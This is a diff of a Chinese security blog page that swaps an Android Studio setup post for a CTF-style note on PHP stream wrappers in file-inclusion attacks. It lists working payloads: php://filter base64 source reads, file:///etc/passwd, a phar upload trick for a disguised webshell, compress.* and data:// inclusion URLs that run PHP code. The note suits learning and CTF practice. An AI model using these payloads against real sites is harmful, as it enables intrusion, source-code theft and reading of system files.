@@ -4,8 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Android Studio踩过的坑, 书鱼">
-    <meta name="description" content="最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的坑1、Unable to access Android SDK add-on list很好奇，为什">
+    <meta name="keywords" content="php伪协议, 书鱼">
+    <meta name="description" content="php支持的伪协议有：php:// — 访问各个输入/输出流（I/O streams）
+file:// — 访问本地文件系统
+phar:// — PHP 归档
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+htt">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Android Studio踩过的坑 | 书鱼</title>
+    <title>php伪协议 | 书鱼</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -231,13 +236,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Android Studio踩过的坑
+                        php伪协议
                     </div>
                 </div>
             </div>
@@ -349,8 +354,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Android/">
-                                <span class="chip bg-color">Android</span>
+                            <a href="/tags/PHP/">
+                                <span class="chip bg-color">PHP</span>
                             </a>
                         
                     </div>
@@ -361,12 +366,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/" class="post-category">
-                                雁儿几度恋开发-愿得一站入万家
-                            </a>
-                        
-                            <a href="/categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/Android/" class="post-category">
-                                Android
+                            <a href="/categories/Web/" class="post-category">
+                                Web
                             </a>
                         
                     </div>
@@ -378,7 +379,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-04-02
+                    2019-12-03
                 </div>
                 
 
@@ -387,14 +388,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    408
+                    620
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 				
@@ -410,11 +411,42 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的"><a href="#最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的" class="headerlink" title="最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的"></a>最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的</h4><h4 id="坑1、Unable-to-access-Android-SDK-add-on-list"><a href="#坑1、Unable-to-access-Android-SDK-add-on-list" class="headerlink" title="坑1、Unable to access Android SDK add-on list"></a>坑1、Unable to access Android SDK add-on list</h4><p><img src="2.png" alt=""><br>很好奇，为什么安装android studio的时候不直接帮忙装个SDK，非要先装个空壳然后单独下SDK，当然这服务于一些电脑已经装过SDK的同志，但是我觉得在安装AS的时候应该给个选项什么的吧<br>解决办法-就是下载咯</p>
-<a id="more"></a>
-<p><img src="3.png" alt=""><br>然后选择一个位置下就行（为什么是坑呢，因为300m的东西，用我航校园网下了3个小时，后来换流量1分钟就结束了！！！阿伟死了）</p>
-<h4 id="坑2、第一次启动AS的时候配置一写Gradle服务"><a href="#坑2、第一次启动AS的时候配置一写Gradle服务" class="headerlink" title="坑2、第一次启动AS的时候配置一写Gradle服务"></a>坑2、第一次启动AS的时候配置一写Gradle服务</h4><p>第一次打开是这样滴<br><img src="4.png" alt=""><br>看似一切正常，但是你等啊等等阿等，酒喝完了，烟抽完了，还在提示还在下载gradle-XXX-all.zip<br><strong>这一次不是网络问题了。因为流量也贼慢</strong><br>其实AS做的操作就是网上下个包到/.gradle/wrapper/dist/graXX/<br>至于速度为什么这么慢，还真不知道<br><strong>解决办法</strong>：自行下载一个.zip然后放进来（由于上一次下载中止，这个文件夹下会有些其他的垃圾文件，你可以先删除，只留下.zip,然后重启！！一定要重启，然后AS会自动解压使用！<br><a href="http://services.gradle.org/distributions/" target="_blank" rel="noopener">gradle下载地址传送门</a><br><img src="1.png" alt=""></p>
-<h3 id="活着挺好的，为什么要学安卓开发"><a href="#活着挺好的，为什么要学安卓开发" class="headerlink" title="活着挺好的，为什么要学安卓开发"></a>活着挺好的，为什么要学安卓开发</h3>
+                <h3 id="php支持的伪协议有："><a href="#php支持的伪协议有：" class="headerlink" title="php支持的伪协议有："></a>php支持的伪协议有：</h3><pre><code>php:// — 访问各个输入/输出流（I/O streams）
+file:// — 访问本地文件系统
+phar:// — PHP 归档
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+glob:// — 查找匹配的文件路径模式
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流</code></pre><p><img src="1.png" alt=""></p>
+<h3 id="环境支持"><a href="#环境支持" class="headerlink" title="环境支持"></a>环境支持</h3><p>PHP.ini：</p>
+<pre><code>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。
+allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</code></pre><h4 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php://协议"></a>1.php://协议</h4><pre><code>php://filter
+php://input
+php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取源代码并进行base64编码输出。</code></pre><p>payload如下：</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=upload.php</code></pre><p>php://input：访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的。 例子一</p>
+<h4 id="2-file-协议"><a href="#2-file-协议" class="headerlink" title="2.file://协议"></a>2.file://协议</h4><p>file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。例子一，例子二<br>使用方法：</p>
+<pre><code>file:// [文件的绝对路径和文件名]
+file:///etc/passwd</code></pre><h4 id="3-phar-协议"><a href="#3-phar-协议" class="headerlink" title="3.phar://协议"></a>3.phar://协议</h4><p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。例子一</p>
+<pre><code>nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.php</code></pre><h4 id="4-zlib-协议"><a href="#4-zlib-协议" class="headerlink" title="4.zlib://协议"></a>4.zlib://协议</h4><pre><code>zip://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：
+
+file.php?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
+file.php?file=zip://nac.jpg#nac.php  其中get请求中#需要进行编码，即%23</code></pre><p>bzip2://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：</p>
+<pre><code>file.php?file=compress.bzip2://nac.bz2
+file.php?file=compress.bzip2://./nac.jpg
+file.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></pre><p>zlib://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：</p>
+<pre><code>file.php?file=compress.zlib://file.gz
+file.php?file=compress.zlib://./nac.jpg
+file.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></pre><h4 id="5-data-协议"><a href="#5-data-协议" class="headerlink" title="5.data://协议"></a>5.data://协议</h4><p>data://：需满足allow_url_fopen，allow_url_include同时开启才能使用，使用如下：</p>
+<pre><code>file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;
+file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+file.php?file=data:text/plain,&lt;?php phpinfo()?&gt;
+file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">参考https://www.freebuf.com/column/148886.html</a></p>
+
             </div>
             <hr/>
 
@@ -439,7 +471,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://kit4y.github.io/2019/04/02/android-studio-cai-guo-de-keng/">https://kit4y.github.io/2019/04/02/android-studio-cai-guo-de-keng/</a>
+                    <a href="https://kit4y.github.io/2019/12/03/php-wei-xie-yi/">https://kit4y.github.io/2019/12/03/php-wei-xie-yi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -477,8 +509,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Android/">
-                                    <span class="chip bg-color">Android</span>
+                                <a href="/tags/PHP/">
+                                    <span class="chip bg-color">PHP</span>
                                 </a>
                             
                         </div>
@@ -519,47 +551,53 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/04/09/2019-nian-xi-hu-lun-jian-zhi-wei-ji-ni-ya-he-autokey-de-qu-bie/">
+                <a href="/2019/12/03/php-wei-xie-yi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="2019年西湖论剑之维吉尼亚和AutoKey的区别">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="php伪协议">
                         
-                        <span class="card-title">2019年西湖论剑之维吉尼亚和AutoKey的区别</span>
+                        <span class="card-title">php伪协议</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            奇怪的TTL题目描述：我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？
-1、数据整理附件中给了个文件,发现ttl.txt中的ttl只有4个值63,1
+                            php支持的伪协议有：php:// — 访问各个输入/输出流（I/O streams）
+file:// — 访问本地文件系统
+phar:// — PHP 归档
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+htt
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-04-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Crypto/" class="post-category">
-                                    Crypto
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">
-                        <span class="chip bg-color">密码学</span>
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
@@ -573,44 +611,32 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/03/21/jing-tong-python-wang-luo-pa-chong-san-si-zhang-ji-ben-shi-yong/">
+                <a href="/2019/12/03/php-zhong-shen-mi-de-md5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="精通Python网络爬虫-四五章基本使用">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="php中佛系的md5和数组">
                         
-                        <span class="card-title">精通Python网络爬虫-四五章基本使用</span>
+                        <span class="card-title">php中佛系的md5和数组</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、时代变迁下的比较:
-
-
-Python2.x时代
-Python3.x时代
-
-
-
-import urllib2
-import urllib.request,urllib.error
-
-
-import urllib
-import urllib
+                            1、MD5函数漏洞$_GET[&#39;name&#39;] != $_GET[&#39;password&#39;]
+MD5($_GET[&#39;name&#39;]) == MD5($_GET[&#39;password&#39;])
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-03-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%B2%BE%E9%80%9APython%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/" class="post-category">
-                                    精通Python网络爬虫
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
                                 </a>
                             
                             
@@ -620,8 +646,8 @@ import urllib
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%88%AC%E8%99%AB/">
-                        <span class="chip bg-color">爬虫</span>
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
